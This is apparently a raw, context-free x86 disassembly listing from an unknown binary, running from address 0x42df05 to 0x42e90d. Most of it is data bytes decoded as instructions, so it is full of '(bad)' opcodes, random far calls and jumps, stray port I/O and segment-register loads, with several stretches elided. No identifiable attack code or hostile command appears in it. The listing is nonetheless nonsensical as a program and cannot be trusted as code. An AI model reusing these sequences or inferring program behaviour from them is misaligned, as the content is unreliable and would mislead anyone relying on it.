  42df05:	mov    ch,0x7e
  42df07:	test   DWORD PTR [ecx+0x42bca137],0xf4be3ab1
  42df11:	mov    bl,0xa9
  42df13:	jge    0x42debf
  42df15:	cdq    
  42df16:	jae    0x42df79
  42df18:	enter  0xc684,0x42
  42df1c:	(bad)  
  42df1d:	pushf  
  42df1e:	sub    esp,edi
  42df20:	pushf  
  42df21:	or     esi,DWORD PTR cs:[edx+edi*2-0x77]
  42df26:	inc    esi
  42df27:	mov    bh,0x80
  42df29:	test   edi,eax
  42df2b:	dec    ecx
  42df2c:	pop    es
  42df2d:	add    dl,BYTE PTR [esi+eiz*2-0x2ddef219]
  42df34:	inc    ecx
  42df35:	pop    esp
  42df36:	cmps   DWORD PTR es:[si],DWORD PTR es:[di]
  42df39:	mov    cl,0x8
  42df3b:	add    DWORD PTR [esi+ecx*4],ecx
  42df3e:	cmp    edi,0xf39d150
  42df44:	mov    eax,0xf7e663e
  42df49:	maskmovq mm1,mm4
  42df4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df4d:	sub    al,BYTE PTR [eax-0x5ad664c6]
  42df53:	sub    eax,0x17401b4f
  42df58:	inc    edx
  42df59:	call   0x88fb:0x6294d761
  42df60:	jno    0x42df08
  42df62:	clc    
  42df63:	pop    ecx
  42df64:	lods   eax,DWORD PTR ds:[esi]
  42df65:	rol    DWORD PTR [edi],cl
  42df67:	dec    ebp
  42df68:	jl     0x42df31
  42df6a:	dec    ebx
  42df6b:	inc    ecx
  42df6c:	gs test DWORD PTR gs:[ebp-0xd],eax
  42df71:	adc    DWORD PTR [esi-0x9],ebx
  42df74:	pushf  
  42df75:	adc    al,0x3
  42df77:	int3   
  42df78:	jbe    0x42df16
  42df7a:	jecxz  0x42dfda
  42df7c:	sub    esp,DWORD PTR [ecx]
  42df7e:	add    al,0x92
  42df80:	xlat   BYTE PTR ds:[ebx]
  42df81:	cmc    
  42df82:	repnz sbb ecx,ebp
  42df85:	xchg   edi,eax
  42df86:	xlat   BYTE PTR ds:[ebx]
  42df87:	pop    esp
  42df88:	fcmovne st,st(6)
  42df8a:	lea    edi,ds:0x5ec70349
  42df90:	sbb    eax,0x0
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x19]
  42e001:	mov    dh,0x30
  42e003:	cmovp  ebp,ebp
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0x33000001
  42e00d:	and    ch,al
  42e00f:	cmp    DWORD PTR [eax+ecx*2+0x12],edi
  42e013:	cwde   
  42e014:	aam    0xb3
  42e016:	push   ebx
  42e017:	ror    DWORD PTR [ecx-0x3d592035],1
  42e01d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e01e:	mov    edi,DWORD PTR [edx+0x35c7fef6]
  42e024:	cmp    ebp,DWORD PTR [ebp+ecx*8-0x5e]
  42e028:	scas   al,BYTE PTR es:[edi]
  42e029:	inc    ecx
  42e02a:	mov    edi,0x9f8bafa0
  42e02f:	mov    ebp,0x9a3b0f9
  42e034:	jbe    0x42e0a7
  42e036:	push   es
  42e037:	stc    
  42e038:	adc    ebp,DWORD PTR [edx-0x75000169]
  42e03e:	mov    WORD PTR [ecx-0x2ced396c],fs
  42e044:	fidiv  WORD PTR [edi+0x4e]
  42e047:	and    al,0x58
  42e049:	push   0x55dc8f97
  42e04e:	add    DWORD PTR [esi],0xffffffc1
  42e051:	pop    ss
  42e052:	push   eax
  42e053:	jno    0x42e066
  42e055:	add    DWORD PTR [edi+0x6c],ecx
  42e058:	pop    ds
  42e059:	shl    BYTE PTR [edi+0x3e4cceb5],cl
  42e05f:	adc    al,0x0
  42e061:	mov    al,ds:0x22010c3c
  42e067:	std    
  42e068:	inc    edx
  42e069:	mov    edi,0x669eb4ae
  42e06e:	js     0x42e049
  42e070:	in     al,dx
  42e071:	shr    DWORD PTR [eax-0x23ce1e62],0x3b
  42e078:	inc    edx
  42e079:	in     al,0x62
  42e07b:	xor    al,0x35
  42e07d:	pop    es
  42e07e:	and    eax,0xd65d3f76
  42e083:	or     bl,dl
  42e085:	xchg   esi,eax
  42e086:	jmp    0xc2c206aa
  42e08b:	cmp    al,0x7
  42e08d:	je     0x42e0fd
  42e08f:	aaa    
  42e090:	pop    ds
  42e091:	mov    esp,0x34fccc3c
  42e096:	les    ebx,FWORD PTR [eax+0x35221ddf]
  42e09c:	push   0xf7c41bfc
  42e0a1:	cmp    ebp,DWORD PTR [edx]
  42e0a3:	lods   al,BYTE PTR ds:[esi]
  42e0a4:	pop    edi
  42e0a5:	and    ecx,esp
  42e0a7:	cli    
  42e0a8:	cs push edi
  42e0aa:	adc    DWORD PTR [eax+esi*2+0x24e2458e],0x63
  42e0b2:	jle    0x42e10b
  42e0b4:	dec    esp
  42e0b5:	pop    edi
  42e0b6:	mov    ch,0xb5
  42e0b8:	add    al,BYTE PTR [ecx-0x25]
  42e0bb:	ins    DWORD PTR es:[edi],dx
  42e0bc:	xor    BYTE PTR [ebx-0x61],dh
  42e0bf:	in     al,0x7a
  42e0c1:	(bad)  
  42e0c2:	mov    dl,0xa1
  42e0c4:	dec    edx
  42e0c5:	push   0xf5de465b
  42e0ca:	stos   WORD PTR es:[edi],ax
  42e0cc:	cmp    bh,BYTE PTR [eax]
  42e0ce:	imul   edi,DWORD PTR [ebx],0x6b
  42e0d1:	retf   0x5491
  42e0d4:	add    eax,0x7ea1e1be
  42e0d9:	push   eax
  42e0da:	cmp    DWORD PTR [esi+eiz*2],eax
  42e0dd:	mov    ss,WORD PTR [ecx-0x2083c111]
  42e0e3:	xor    ch,BYTE PTR [eax+ebx*1-0x76907cc1]
  42e0ea:	ret    
  42e0eb:	add    bh,bl
  42e0ed:	scas   al,BYTE PTR es:[edi]
  42e0ee:	inc    edx
  42e0ef:	mov    eax,ds:0x6921d36
  42e0f4:	stc    
  42e0f5:	out    0x27,eax
  42e0f7:	or     al,0xe3
  42e0f9:	popa   
  42e0fa:	jo     0x42e08e
  42e0fc:	pop    esp
  42e0fd:	das    
  42e0fe:	imul   ecx,DWORD PTR [eax-0x61],0xe6192f4f
  42e105:	ror    BYTE PTR [edx-0x42],0x44
  42e109:	call   0x29dbd806
  42e10e:	sti    
  42e10f:	addr16 or al,0x0
	...
  42e172:	add    BYTE PTR [eax],al
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	ins    BYTE PTR es:[edi],dx
  42e181:	loop   0x42e136
  42e183:	or     DWORD PTR [edi-0x12],0x1
  42e187:	add    BYTE PTR ds:0xa6000001,al
  42e18d:	jl     0x42e1ed
  42e18f:	pop    esi
  42e190:	test   cl,0x21
  42e193:	jl     0x42e199
  42e195:	dec    ecx
  42e196:	jne    0x42e15b
  42e198:	popf   
  42e199:	mov    DWORD PTR [eax+0x4c],edx
  42e19c:	or     ah,BYTE PTR [edx]
  42e19e:	div    BYTE PTR [edx+0x45]
  42e1a1:	xchg   edx,eax
  42e1a2:	add    DWORD PTR [ebp+0x77],edx
  42e1a5:	js     0x42e192
  42e1a7:	xchg   BYTE PTR [ecx-0xb96fa3f],bl
  42e1ad:	dec    ecx
  42e1ae:	addr16 push ss
  42e1b0:	adc    DWORD PTR [ebp+edx*2-0x47f33ccf],edx
  42e1b7:	add    DWORD PTR [ebp+ecx*1-0x76],eax
  42e1bb:	ror    BYTE PTR [edi+ecx*4-0x4d],0xea
  42e1c0:	jnp    0x42e21d
  42e1c2:	push   ss
  42e1c3:	xchg   edx,eax
  42e1c4:	ins    BYTE PTR es:[edi],dx
  42e1c5:	rcl    BYTE PTR [esi+0x7f],0x69
  42e1c9:	push   esp
  42e1ca:	lods   al,BYTE PTR ds:[esi]
  42e1cb:	lods   al,BYTE PTR ds:[esi]
  42e1cc:	ins    BYTE PTR es:[edi],dx
  42e1cd:	mov    ebx,0x221773d1
  42e1d2:	or     al,0x8a
  42e1d4:	sub    BYTE PTR [ebx-0x1a36adb6],bh
  42e1da:	mov    ebp,0x89c47f3d
  42e1df:	xchg   ebx,eax
  42e1e0:	adc    ch,ch
  42e1e2:	in     al,0x7f
  42e1e4:	fist   WORD PTR [esi+0x22]
  42e1e7:	shr    esp,1
  42e1e9:	outs   dx,BYTE PTR ds:[esi]
  42e1ea:	and    BYTE PTR [ebp-0x4c1e05a2],al
  42e1f0:	std    
  42e1f1:	sar    BYTE PTR [esi+0x64],0xd3
  42e1f5:	jns    0x42e26d
  42e1f7:	xlat   BYTE PTR ds:[ebx]
  42e1f8:	mov    ch,0xe9
  42e1fa:	and    ebp,DWORD PTR [eax-0xa]
  42e1fd:	clc    
  42e1fe:	out    dx,eax
  42e1ff:	fst    st(1)
  42e201:	fadd   QWORD PTR [eax-0x3]
  42e204:	add    bl,BYTE PTR [edi]
  42e206:	xchg   DWORD PTR [ecx+edi*4+0x35651a89],edx
  42e20d:	gs je  0x42e1b1
  42e210:	ja     0x42e19f
  42e212:	mov    dl,0xa1
  42e214:	(bad)  [esp+eax*2-0x737051f3]
  42e21b:	jg     0x42e1cc
  42e21d:	cld    
  42e21e:	les    edx,FWORD PTR [edx]
  42e220:	jb     0x42e251
  42e222:	clc    
  42e223:	pop    esi
  42e224:	or     eax,0xbef81428
  42e229:	adc    edi,DWORD PTR [esi-0x74948618]
  42e22f:	sbb    dh,cl
  42e231:	add    dl,BYTE PTR [ebp-0x7]
  42e234:	jo     0x42e1be
  42e236:	mov    ecx,DWORD PTR [esi-0x6f5ab120]
  42e23c:	cmp    edi,DWORD PTR [eax+0x3e]
  42e23f:	xlat   BYTE PTR ds:[ebx]
  42e240:	into   
  42e241:	push   ebp
  42e242:	or     bl,BYTE PTR [esi+eiz*4]
  42e245:	mov    edx,0x402fe81f
  42e24a:	clc    
  42e24b:	xchg   DWORD PTR ds:0xc6fdbd0e,esp
  42e251:	in     al,0x43
  42e253:	push   cs
  42e254:	das    
  42e255:	sbb    eax,0xc09c2c81
  42e25a:	(bad)  
  42e25b:	jg     0x42e269
  42e25d:	cld    
  42e25e:	je     0x42e229
  42e260:	popw   ss
  42e262:	pusha  
  42e263:	push   ebp
  42e264:	cmp    bh,BYTE PTR ds:0x6fa298c5
  42e26a:	in     al,0x34
  42e26c:	jp     0x42e243
  42e26e:	dec    eax
  42e26f:	addr16 loopne 0x42e238
  42e272:	jne    0x42e2ac
  42e274:	add    DWORD PTR [eax+edx*4-0x2f29bd42],edi
  42e27b:	pop    esp
  42e27c:	pop    esi
  42e27d:	mov    es,WORD PTR [ecx+eiz*4]
  42e280:	(bad)  
  42e281:	fcomi  st,st(1)
  42e283:	adc    DWORD PTR [edx],ebp
  42e285:	(bad)  
  42e286:	push   esp
  42e287:	jmp    0x42e289
  42e289:	adc    DWORD PTR [ebp+eiz*1-0x76],edx
  42e28d:	iret   
  42e28e:	jo     0x42e30f
  42e290:	adc    eax,0x0
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x79199140
  42e301:	xchg   ebp,eax
  42e302:	inc    dh
  42e304:	push   esp
  42e305:	out    dx,eax
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0x2d000001
  42e30d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42e30f:	(bad)  
  42e310:	xor    eax,0x869d3715
  42e315:	dec    esi
  42e316:	dec    esi
  42e317:	arpl   WORD PTR [eax+ecx*4-0x25],sp
  42e31b:	jl     0x42e365
  42e31d:	enter  0xf4f5,0x3f
  42e321:	in     al,dx
  42e322:	ins    BYTE PTR es:[edi],dx
  42e323:	and    esi,ebp
  42e325:	fild   QWORD PTR [ecx]
  42e327:	jae    0x42e30e
  42e329:	mov    bh,0x90
  42e32b:	popa   
  42e32c:	lahf   
  42e32d:	jnp    0x42e2f6
  42e32f:	js     0x42e30f
  42e331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e332:	ins    DWORD PTR es:[edi],dx
  42e333:	pop    esi
  42e334:	leave  
  42e335:	mov    ecx,0x25446c83
  42e33a:	sbb    esi,DWORD PTR [ecx-0x69]
  42e33d:	push   ebx
  42e33e:	dec    edi
  42e33f:	adc    dl,BYTE PTR [edx]
  42e341:	rol    ebx,1
  42e343:	sub    dl,dl
  42e345:	sub    eax,0xe08829cc
  42e34a:	sub    DWORD PTR [edx+0x2],esp
  42e34d:	out    dx,eax
  42e34e:	dec    ecx
  42e34f:	es adc eax,0x95ddcf68
  42e355:	mov    eax,ds:0xf87bec94
  42e35a:	cld    
  42e35b:	pop    ecx
  42e35c:	sti    
  42e35d:	out    0xb9,eax
  42e35f:	les    esp,FWORD PTR [edi-0x1d5af5a5]
  42e365:	les    ebx,FWORD PTR [esi]
  42e367:	aaa    
  42e368:	push   ebp
  42e369:	jmp    0x42e358
  42e36b:	sub    cl,BYTE PTR [edi]
  42e36d:	(bad)
  42e370:	xor    BYTE PTR [edx-0x7e],0xe7
  42e374:	pop    es
  42e375:	fistp  DWORD PTR [edi]
  42e377:	mov    dh,0x7e
  42e379:	bound  ebx,QWORD PTR [edx]
  42e37b:	sahf   
  42e37c:	jnp    0x42e367
  42e37e:	sub    BYTE PTR [eax+0x7172b58a],0x34
  42e385:	mov    dl,0x20
  42e387:	fsubrp st(5),st
  42e389:	leave  
  42e38a:	(bad)  
  42e38b:	out    dx,al
  42e38c:	stos   DWORD PTR es:[edi],eax
  42e38d:	jmp    0x42e322
  42e38f:	int3   
  42e390:	xchg   BYTE PTR ds:0xe4b4767e,dl
  42e396:	sbb    esp,ecx
  42e398:	add    bh,BYTE PTR [ecx+0x4]
  42e39b:	iret   
  42e39c:	push   edx
  42e39d:	in     al,dx
  42e39e:	pop    eax
  42e39f:	sub    al,0xe3
  42e3a1:	int    0x2c
  42e3a3:	push   edx
  42e3a4:	fisub  WORD PTR [eax-0x30]
  42e3a7:	fsubr  DWORD PTR [ecx-0x3c]
  42e3aa:	inc    ebp
  42e3ab:	aas    
  42e3ac:	dec    esi
  42e3ad:	and    dh,0xb3
  42e3b0:	push   eax
  42e3b1:	test   DWORD PTR [esi],0xcd8a62b5
  42e3b7:	add    eax,0x955a3a96
  42e3bc:	add    al,0xf2
  42e3be:	xchg   edx,eax
  42e3bf:	ret    0xcc06
  42e3c2:	inc    esi
  42e3c3:	popa   
  42e3c4:	das    
  42e3c5:	int    0x2c
  42e3c7:	out    0x13,eax
  42e3c9:	xor    BYTE PTR [ecx+0x17d7ff19],0xa2
  42e3d0:	fcmovnu st,st(7)
  42e3d2:	mov    ds:0x8bbc03e3,eax
  42e3d7:	xchg   ebp,eax
  42e3d8:	jge    0x42e41b
  42e3da:	jge    0x42e380
  42e3dc:	inc    ebp
  42e3dd:	xor    cl,al
  42e3df:	lahf   
  42e3e0:	mov    dl,0x3
  42e3e2:	jb     0x42e441
  42e3e4:	mov    ch,0x7a
  42e3e6:	out    dx,eax
  42e3e7:	lds    esp,FWORD PTR [ecx+0x54138e24]
  42e3ed:	and    ebp,DWORD PTR [edx+0x0]
  42e3f0:	adc    edi,edx
  42e3f2:	adc    esp,esi
  42e3f4:	xchg   ebx,eax
  42e3f5:	jo     0x42e380
  42e3f7:	(bad)  
  42e3f8:	adc    eax,0x57043104
  42e3fd:	inc    esi
  42e3fe:	push   ds
  42e3ff:	push   ecx
  42e400:	or     eax,0xe7efa2cb
  42e405:	or     BYTE PTR [ecx-0x54befb12],cl
  42e40b:	xor    ecx,DWORD PTR [ebx-0x76d1dd25]
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	sbb    eax,0x591c123c
  42e485:	lock add DWORD PTR [eax],eax
  42e488:	add    eax,0x4a000001
  42e48d:	cmp    ch,BYTE PTR [eax-0x20]
  42e490:	cli    
  42e491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e492:	push   cs
  42e493:	or     eax,0xa048a7b1
  42e498:	into   
  42e499:	sub    bh,al
  42e49b:	and    BYTE PTR [ebx-0x79c7c61b],0x5d
  42e4a2:	mov    ch,0xea
  42e4a4:	cmp    eax,0xbec2a984
  42e4a9:	mov    cs,WORD PTR [edi+esi*4]
  42e4ac:	outs   dx,DWORD PTR ds:[esi]
  42e4ad:	cmp    esi,DWORD PTR [ebp-0x1d2a1f6c]
  42e4b3:	sub    ebp,DWORD PTR [edi+esi*4-0x22aeb9d2]
  42e4ba:	or     esi,edi
  42e4bc:	xchg   ebx,eax
  42e4bd:	xchg   ebx,eax
  42e4be:	arpl   WORD PTR [edx-0x6cd12d6a],dx
  42e4c4:	jg     0x42e459
  42e4c6:	push   0x52
  42e4c8:	sbb    edx,DWORD PTR [eax]
  42e4ca:	xchg   esi,eax
  42e4cb:	pop    edi
  42e4cc:	mov    WORD PTR [edx],?
  42e4ce:	fdiv   DWORD PTR [esi+0x5d]
  42e4d1:	scas   eax,DWORD PTR es:[edi]
  42e4d2:	arpl   WORD PTR [ecx-0xd78d9d1],ax
  42e4d8:	dec    ebx
  42e4d9:	sub    eax,DWORD PTR [esi+0x7e2cb445]
  42e4df:	xor    DWORD PTR [edx],ebp
  42e4e1:	psubsb mm7,QWORD PTR ds:0x31579935
  42e4e8:	adc    eax,0x9e62fa2
  42e4ed:	mov    cl,0x92
  42e4ef:	mov    ch,0x50
  42e4f1:	sub    BYTE PTR [esi-0x79],cl
  42e4f4:	imul   esp,DWORD PTR [edx],0x2f9ae42f
  42e4fa:	mov    esi,0x804e4162
  42e4ff:	int    0x4b
  42e501:	adc    bl,cl
  42e503:	sub    DWORD PTR [eax+0x7feeb538],0xd26d7230
  42e50d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e50e:	cmp    DWORD PTR [eax+0x3a],ecx
  42e511:	(bad)  [esi]
  42e513:	lods   al,BYTE PTR ds:[esi]
  42e514:	call   0x62facf78
  42e519:	mov    ch,0xf0
  42e51b:	xchg   esp,eax
  42e51c:	mov    dl,0x30
  42e51e:	cmp    ebp,DWORD PTR [eax]
  42e520:	test   BYTE PTR [edi+0x18180582],al
  42e526:	mov    dh,0x89
  42e528:	leave  
  42e529:	push   ecx
  42e52a:	clc    
  42e52b:	mov    ch,0xe1
  42e52d:	ins    DWORD PTR es:[edi],dx
  42e52e:	inc    eax
  42e52f:	push   edi
  42e530:	push   ebx
  42e531:	mov    ecx,0x88bbfd1d
  42e536:	or     DWORD PTR [edx+0x4efcfb36],ecx
  42e53c:	fnstenv [esi]
  42e53e:	mov    ah,0xdd
  42e540:	push   esp
  42e541:	std    
  42e542:	aas    
  42e543:	shr    BYTE PTR [ebx-0x35e215c7],0x95
  42e54a:	jecxz  0x42e52b
  42e54c:	addr16 jge 0x42e551
  42e54f:	jecxz  0x42e54a
  42e551:	pop    edi
  42e552:	aad    0x1f
  42e554:	or     cl,ch
  42e556:	sti    
  42e557:	pop    eax
  42e558:	fcmovnbe st,st(7)
  42e55a:	push   es
  42e55b:	cmp    al,0x28
  42e55d:	shl    BYTE PTR [edi-0x64],1
  42e560:	adc    ecx,DWORD PTR [ecx+0x15]
  42e563:	mov    edx,0x4be8b1c7
  42e568:	std    
  42e569:	dec    edi
  42e56a:	arpl   WORD PTR [eax+0x71],bx
  42e56d:	mov    edi,0xd48b9069
  42e572:	shr    DWORD PTR [ebx],0xa1
  42e575:	(bad)  
  42e576:	shl    DWORD PTR [edx],0x23
  42e579:	aas    
  42e57a:	push   edi
  42e57b:	rcr    DWORD PTR ds:0xf40b28dc,1
  42e581:	pop    ebp
  42e582:	out    dx,al
  42e583:	adc    cl,BYTE PTR [esi+edi*1]
  42e586:	mov    edi,0xf32408cf
  42e58b:	(bad)  
  42e58c:	sbb    DWORD PTR ds:0x870274,eax
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	jo     0x42e59a
  42e602:	inc    ecx
  42e603:	jmp    0x105:0x1f15e
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	mov    cs,WORD PTR [eax]
  42e60e:	imul   ebp,eax,0x21fb41ac
  42e614:	xlat   BYTE PTR ds:[ebx]
  42e615:	outs   dx,DWORD PTR ds:[esi]
  42e616:	fdiv   QWORD PTR [edx+ebx*4+0x2318ea7b]
  42e61d:	jb     0x42e5da
  42e61f:	pop    eax
  42e620:	add    al,0x9c
  42e622:	fwait
  42e623:	jb     0x42e673
  42e625:	fcmovb st,st(2)
  42e627:	ret    
  42e628:	mov    edi,0x76dac7b2
  42e62d:	xchg   DWORD PTR [ebp*8-0xf7f5e79],ebx
  42e634:	fdivr  QWORD PTR [eax-0x636d5c6b]
  42e63a:	cmp    al,0x75
  42e63c:	out    dx,eax
  42e63d:	pop    ds
  42e63e:	stos   BYTE PTR es:[edi],al
  42e63f:	pop    ds
  42e640:	add    esp,DWORD PTR [eax]
  42e642:	ja     0x42e634
  42e644:	and    DWORD PTR [ecx],0x52
  42e647:	lahf   
  42e648:	xor    al,0xbd
  42e64a:	scas   al,BYTE PTR es:[edi]
  42e64b:	inc    eax
  42e64c:	sbb    al,0x84
  42e64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e64f:	xor    al,0x31
  42e651:	repz les ebx,FWORD PTR ds:0x67c30b8f
  42e658:	add    esp,eax
  42e65a:	xor    DWORD PTR [ebx+eax*1+0x41364953],esi
  42e661:	push   ds
  42e662:	cmp    al,0x95
  42e664:	ja     0x42e5e6
  42e666:	retf   0x2c62
  42e669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e66a:	fisttp DWORD PTR [ebp+0x5b]
  42e66d:	outs   dx,DWORD PTR ds:[esi]
  42e66e:	out    dx,eax
  42e66f:	mov    eax,ds:0xa626e375
  42e674:	jmp    0xe724c9eb
  42e679:	push   esp
  42e67a:	add    ebp,DWORD PTR ds:0xbcb83163
  42e680:	adc    BYTE PTR [esp+eax*1-0x8],al
  42e684:	jp     0x42e640
  42e686:	jo     0x42e649
  42e688:	inc    esp
  42e689:	loope  0x42e6f5
  42e68b:	mov    edi,0x7d6ab4c5
  42e690:	lahf   
  42e691:	js     0x42e6b3
  42e693:	bound  esi,QWORD PTR [ebx-0x12]
  42e696:	icebp  
  42e697:	scas   al,BYTE PTR es:[edi]
  42e698:	jae    0x42e70e
  42e69a:	mov    esp,0x542806aa
  42e69f:	lds    ebx,FWORD PTR [ebp-0x5b9124be]
  42e6a5:	jbe    0x42e6da
  42e6a7:	inc    edx
  42e6a8:	inc    ebx
  42e6a9:	popa   
  42e6aa:	sub    eax,0xe4a2cc91
  42e6af:	leave  
  42e6b0:	or     ch,ah
  42e6b2:	int    0x9c
  42e6b4:	cmc    
  42e6b5:	call   0xd697682b
  42e6ba:	xor    al,0x56
  42e6bc:	push   cs
  42e6bd:	mov    DWORD PTR [esi+0x26],edi
  42e6c0:	int    0x8a
  42e6c2:	sub    cl,BYTE PTR [ebp+0x5b67ff5a]
  42e6c8:	jmp    0x42e698
  42e6ca:	mov    ds:0xecf35856,al
  42e6cf:	ja     0x42e653
  42e6d1:	mov    edi,0x5da5a3b5
  42e6d6:	ret    0xb34c
  42e6d9:	(bad)  
  42e6da:	adc    eax,DWORD PTR [edx-0x3cb7b8a5]
  42e6e0:	cmp    BYTE PTR [edi-0x6b],bl
  42e6e3:	fwait
  42e6e4:	add    cl,ch
  42e6e6:	dec    edx
  42e6e7:	lock es dec ecx
  42e6ea:	inc    edx
  42e6eb:	adc    eax,0xe928acc8
  42e6f0:	rol    edx,cl
  42e6f2:	or     DWORD PTR [ecx+0x3e],esp
  42e6f5:	sti    
  42e6f6:	add    al,0x6
  42e6f8:	shr    DWORD PTR [ebp-0x55],cl
  42e6fb:	aam    0x7b
  42e6fd:	lock imul ebp,DWORD PTR [edi],0xf7a00a8e
  42e704:	(bad)  
  42e705:	ror    DWORD PTR ds:0x8e5f8743,0x54
  42e70c:	or     al,0xc1
  42e70e:	xlat   BYTE PTR ds:[ebx]
  42e70f:	sahf   
  42e710:	mov    es,WORD PTR [eax]
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fisub  DWORD PTR [eax+0x633ee143]
  42e785:	repnz add DWORD PTR [eax],eax
  42e788:	add    eax,0xb0000001
  42e78d:	mov    esi,0x8392fd19
  42e792:	call   0xaac3:0x85dbeb34
  42e799:	push   ebp
  42e79a:	push   ss
  42e79b:	loop   0x42e7ec
  42e79d:	in     al,dx
  42e79e:	sahf   
  42e79f:	arpl   WORD PTR ds:[ebx+0xd956f2d],cx
  42e7a6:	push   ebp
  42e7a7:	call   0x3ab94b92
  42e7ac:	cmp    DWORD PTR [edi-0x31],edx
  42e7af:	mov    al,0x8e
  42e7b1:	jne    0x42e79e
  42e7b3:	lock iret 
  42e7b5:	cli    
  42e7b6:	cmp    BYTE PTR ds:0x65ecf3cf,ah
  42e7bc:	mov    ss,WORD PTR [ebp+0x31]
  42e7bf:	jnp    0x42e7e3
  42e7c1:	sub    al,0x90
  42e7c3:	stos   BYTE PTR es:[edi],al
  42e7c4:	inc    edx
  42e7c5:	es mov bl,0xd6
  42e7c8:	pop    edx
  42e7c9:	pop    ebx
  42e7ca:	(bad)  [ebx]
  42e7cc:	dec    esi
  42e7cd:	mov    eax,0xbaeddedd
  42e7d2:	sub    edi,DWORD PTR [ebp-0x37]
  42e7d5:	fst    DWORD PTR [ecx+ebx*2]
  42e7d8:	push   edx
  42e7d9:	xor    esi,DWORD PTR [ecx]
  42e7db:	dec    esi
  42e7dc:	mov    ebx,0x8c3fc9a
  42e7e1:	xchg   ebx,eax
  42e7e2:	mov    eax,ds:0x47cbb835
  42e7e7:	xchg   DWORD PTR [ecx],edx
  42e7e9:	jno    0x42e7b8
  42e7eb:	call   0xb993:0x449004d7
  42e7f2:	cwde   
  42e7f3:	(bad)  
  42e7f4:	and    BYTE PTR [ecx],dl
  42e7f6:	adc    eax,0x74abb889
  42e7fb:	mov    ?,WORD PTR [ebx]
  42e7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e7fe:	test   al,0xa2
  42e800:	inc    esi
  42e801:	mov    eax,ds:0x876ef584
  42e806:	out    dx,eax
  42e807:	jae    0x42e7cd
  42e809:	mov    DWORD PTR [esi],ecx
  42e80b:	stc    
  42e80c:	sub    BYTE PTR [ecx+0x7d05166c],0x1f
  42e813:	xchg   edi,eax
  42e814:	cmp    BYTE PTR [ecx],al
  42e816:	pop    esp
  42e817:	mov    eax,0xee6cbb37
  42e81c:	mov    BYTE PTR [ebp+0x6f],cl
  42e81f:	fcmove st,st(6)
  42e821:	std    
  42e822:	mov    esi,0x32df7239
  42e827:	push   esp
  42e828:	cmp    eax,0x6f56bfe5
  42e82d:	sbb    BYTE PTR [eax+0x26bde3e7],ah
  42e833:	imul   eax,DWORD PTR [ebp+edx*8-0x78],0xffffffcb
  42e838:	pop    esi
  42e839:	xchg   ebx,eax
  42e83a:	cmc    
  42e83b:	add    al,0xdf
  42e83d:	mov    ecx,0x766f7814
  42e842:	out    dx,eax
  42e843:	(bad)  
  42e844:	adc    eax,0x5dc93f2d
  42e849:	mov    dl,0x8c
  42e84b:	lods   eax,DWORD PTR ds:[esi]
  42e84c:	arpl   WORD PTR [edi],cx
  42e84e:	mov    cl,0x2b
  42e850:	test   BYTE PTR [ecx],0x16
  42e853:	cwde   
  42e854:	pop    edi
  42e855:	ror    DWORD PTR [eax],1
  42e857:	loopne 0x42e83c
  42e859:	mov    esp,0x41eaad22
  42e85e:	mov    ss,WORD PTR [eax-0x47]
  42e861:	fistp  QWORD PTR es:[eax+0x5]
  42e865:	mov    edi,0x55c3a4b1
  42e86a:	push   ebx
  42e86b:	jge    0x42e810
  42e86d:	das    
  42e86e:	outs   dx,BYTE PTR ds:[esi]
  42e86f:	int3   
  42e870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e871:	fs xchg edx,eax
  42e874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e875:	fnstenv [esi]
  42e877:	sti    
  42e878:	nop/reserved BYTE PTR [edi]
  42e87b:	sub    BYTE PTR [ecx-0x4ef81624],ch
  42e881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e882:	jmp    0xa04:0x20eef645
  42e889:	inc    esp
  42e88a:	push   0x50
  42e88c:	sbb    al,0xdf
  42e88e:	cmp    al,0x3
  42e890:	pop    ds
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x123f82b]
  42e901:	fs sahf 
  42e903:	retf   0xf368
  42e906:	add    DWORD PTR [eax],eax
  42e908:	add    eax,0xcf000001
  42e90d:	(bad)  
